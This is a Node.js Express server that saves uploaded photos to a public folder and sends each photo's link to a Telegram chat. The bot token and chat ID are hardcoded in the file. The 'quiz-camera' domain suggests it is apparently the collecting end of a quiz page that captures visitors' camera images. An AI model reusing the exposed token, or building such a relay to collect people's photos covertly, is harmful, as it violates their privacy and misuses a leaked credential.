import express from "express";
import multer from "multer";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";
import fetch from "node-fetch"; // ✅ For Telegram message sending

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 10000;

// Telegram credentials
const TELEGRAM_BOT_TOKEN = "8323140156:AAEgVqXYHclaAmZXG7nbnMLfZLh9_0RoK_E";
const TELEGRAM_CHAT_ID = "6912530259";

// ✅ Ensure uploads folder exists
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// ✅ Multer setup for file storage
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
});
const upload = multer({ storage });

// ✅ Serve static files (frontend)
app.use(express.static(path.join(__dirname, "public")));

// ✅ Serve uploaded images publicly
app.use("/uploads", express.static(uploadDir));

// ✅ Upload route
app.post("/upload", upload.single("photo"), async (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: "No file uploaded" });
  }

  // ✅ Generate public file URL
  const fileUrl = `https://quiz-camera-ai-1.onrender.com/uploads/${req.file.filename}`;
  console.log(`📸 New photo uploaded: ${fileUrl}`);

  // ✅ Send Telegram notification
  try {
    const message = `📸 *New Photo Uploaded!*\n\n🔗 [View Photo](${fileUrl})`;
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      })
    });
    console.log("✅ Telegram alert sent!");
  } catch (err) {
    console.error("❌ Failed to send Telegram alert:", err);
  }

  // ✅ Response to frontend
  res.json({
    message: "Photo uploaded successfully",
    filePath: req.file.filename
  });
});

// ✅ Start server
app.listen(port, () => console.log(`🚀 Server running on port ${port}`));